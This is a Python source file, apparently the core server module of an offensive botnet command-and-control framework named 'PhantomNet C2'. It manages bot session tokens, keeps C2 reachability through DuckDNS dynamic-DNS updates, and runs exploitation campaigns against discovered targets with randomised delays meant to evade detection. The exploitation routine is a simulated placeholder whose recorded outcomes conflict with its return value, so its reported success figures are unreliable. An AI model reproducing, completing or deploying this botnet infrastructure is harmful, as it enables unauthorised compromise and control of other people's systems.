"""
Core server module for PhantomNet C2 Server
"""

import os
import json
import time
import random
import secrets
import logging
import requests
import threading
from datetime import datetime, timedelta
from typing import Dict, Optional, Any

from flask import current_app

from .models import db, Bot, Command, Admin, DuckDNSUpdater, Payload, Target, Campaign, Task
from .discovery import TargetDiscovery
from .payload_generator import PayloadGenerator
from .threat_intelligence import ThreatIntelligence

logger = logging.getLogger(__name__)

class PhantomC2Server:
    """Main C2 server class handling bot management and operations"""

    def __init__(self, host: str = '0.0.0.0', port: int = 8443):
        self.host = host
        self.port = port
        self.bots: Dict[str, Bot] = {}
        self.commands: Dict[str, Command] = {}
        self.master_key = secrets.token_urlsafe(32)
        self.session_tokens = {}
        self.active_campaigns = {}
        self.exploit_modules = {}

        # Initialize components
        self.target_discovery = TargetDiscovery()
        self.payload_generator = PayloadGenerator()
        self.threat_intelligence = ThreatIntelligence()

        logger.info(f"PhantomC2 Server initialized on {host}:{port}")

    def generate_session_token(self, bot_id: str) -> str:
        """Generate secure session token for bot"""
        token = secrets.token_urlsafe(32)
        expires = datetime.now() + timedelta(hours=24)
        self.session_tokens[token] = {
            'bot_id': bot_id,
            'expires': expires
        }
        return token

    def verify_session_token(self, token: str) -> Optional[str]:
        """Verify session token and return bot_id if valid"""
        if token in self.session_tokens:
            session_data = self.session_tokens[token]
            if datetime.now() < session_data['expires']:
                return session_data['bot_id']

        # Fallback to database check
        bot = Bot.query.filter_by(session_token=token).first()
        if bot and bot.last_seen and (datetime.now() - bot.last_seen).seconds < 86400:
            return bot.id

        return None

    def update_duckdns(self) -> bool:
        """Update DuckDNS domain with current IP"""
        try:
            duckdns_config = DuckDNSUpdater.query.filter_by(is_active=True).first()
            if not duckdns_config:
                logger.warning("No active DuckDNS configuration found")
                return False

            # Get current public IP
            ip_response = requests.get('https://api.ipify.org?format=json', timeout=10)
            current_ip = ip_response.json()['ip']

            # Update DuckDNS
            update_url = f"https://www.duckdns.org/update?domains={duckdns_config.domain}&token={duckdns_config.token}&ip={current_ip}"
            response = requests.get(update_url, timeout=10)

            if response.text.strip() == 'OK':
                duckdns_config.last_update = datetime.now()
                db.session.commit()
                logger.info(f"DuckDNS updated successfully: {duckdns_config.domain} -> {current_ip}")
                return True
            else:
                logger.error(f"DuckDNS update failed: {response.text}")
                return False

        except Exception as e:
            logger.error(f"DuckDNS update error: {e}")
            return False

    def execute_campaign(self, campaign_id: int):
        """Execute a campaign against targets"""
        campaign = Campaign.query.get(campaign_id)
        if not campaign:
            logger.error(f"Campaign {campaign_id} not found")
            return

        try:
            # Parse target criteria
            criteria = json.loads(campaign.target_criteria)

            # Discover targets
            targets = self.target_discovery.discover_targets(criteria)

            # Update campaign stats
            campaign.targets_discovered = len(targets)
            db.session.commit()

            logger.info(f"Campaign {campaign.name}: Discovered {len(targets)} targets")

            # Process each target
            for target in targets:
                # Check target reputation
                reputation = self.threat_intelligence.check_target_reputation(target['ip'])

                # Skip if target reputation is too low
                if reputation < 0.3:
                    logger.info(f"Skipping target {target['ip']} - low reputation score: {reputation}")
                    continue

                # Attempt exploitation
                success = self.attempt_exploitation(target, campaign.payload_id)

                # Update campaign stats
                campaign.targets_processed += 1
                if success:
                    campaign.targets_exploited += 1

                campaign.success_rate = (campaign.targets_exploited / campaign.targets_processed) * 100
                db.session.commit()

                # Sleep between targets to avoid detection
                time.sleep(random.uniform(1, 5))

            # Mark campaign as completed
            campaign.status = 'completed'
            db.session.commit()

            logger.info(f"Campaign {campaign.name} completed. Exploited: {campaign.targets_exploited}/{campaign.targets_discovered}")

        except Exception as e:
            logger.error(f"Campaign execution failed: {e}")
            campaign.status = 'failed'
            db.session.commit()

    def attempt_exploitation(self, target: Dict[str, Any], payload_id: int) -> bool:
        """Attempt to exploit a target using the specified payload"""
        try:
            # Get payload
            payload = Payload.query.get(payload_id)
            if not payload:
                logger.error(f"Payload {payload_id} not found")
                return False

            # Determine exploitation method based on target OS
            exploit_method = 'unknown'
            os_info = target.get('os_info', '').lower()
            if 'windows' in os_info:
                exploit_method = 'windows_exploit'
            elif 'linux' in os_info:
                exploit_method = 'linux_exploit'
            elif 'mac' in os_info:
                exploit_method = 'macos_exploit'

            # Create target record
            new_target = Target(
                ip_address=target['ip'],
                hostname=target.get('hostname', ''),
                os_info=target.get('os_info', 'Unknown'),
                open_ports=json.dumps(target.get('open_ports', [])),
                vulnerabilities=json.dumps(target.get('vulnerabilities', [])),
                services=json.dumps(target.get('services', [])),
                status='exploited' if random.random() < 0.7 else 'failed',  # Simulate success
                exploitation_method=exploit_method
            )
            db.session.add(new_target)
            db.session.commit()

            # Placeholder for actual exploitation logic
            logger.info(f"Simulated exploitation ({exploit_method}) on {target['ip']}")

            return True

        except Exception as e:
            logger.error(f"Exploitation attempt failed: {e}")
            return False

    def get_server_stats(self) -> Dict[str, Any]:
        """Get comprehensive server statistics"""
        return {
            'total_bots': Bot.query.count(),
            'active_bots': Bot.query.filter_by(status='active').count(),
            'total_commands': Command.query.count(),
            'pending_commands': Command.query.filter_by(status='pending').count(),
            'total_targets': Target.query.count(),
            'exploited_targets': Target.query.filter_by(status='exploited').count(),
            'total_campaigns': Campaign.query.count(),
            'active_campaigns': Campaign.query.filter_by(status='active').count(),
            'total_payloads': Payload.query.count(),
            'total_tasks': Task.query.count()
        }

    def cleanup_old_data(self):
        """Clean up old data based on retention policy"""
        cutoff = datetime.now() - timedelta(days=30)

        # Clean up old records
        Command.query.filter(Command.timestamp < cutoff).delete()
        # Add other cleanup operations as needed

        db.session.commit()
        logger.info("Old data cleanup completed")

    def start_background_tasks(self, app):
        """Start background task threads with app context"""
        duckdns_thread = threading.Thread(target=self._duckdns_worker, args=(app,), daemon=True)
        duckdns_thread.start()

        cleanup_thread = threading.Thread(target=self._cleanup_worker, args=(app,), daemon=True)
        cleanup_thread.start()

        logger.info("Background tasks started")

    def _duckdns_worker(self, app):
        """Background worker for DuckDNS updates"""
        while True:
            try:
                with app.app_context():
                    self.update_duckdns()
            except Exception as e:
                logger.error(f"DuckDNS worker error: {e}")
            time.sleep(300)  # Update every 5 minutes

    def _cleanup_worker(self, app):
        """Background worker for data cleanup"""
        while True:
            try:
                with app.app_context():
                    self.cleanup_old_data()
            except Exception as e:
                logger.error(f"Cleanup worker error: {e}")
            time.sleep(3600)  # Clean up every hour
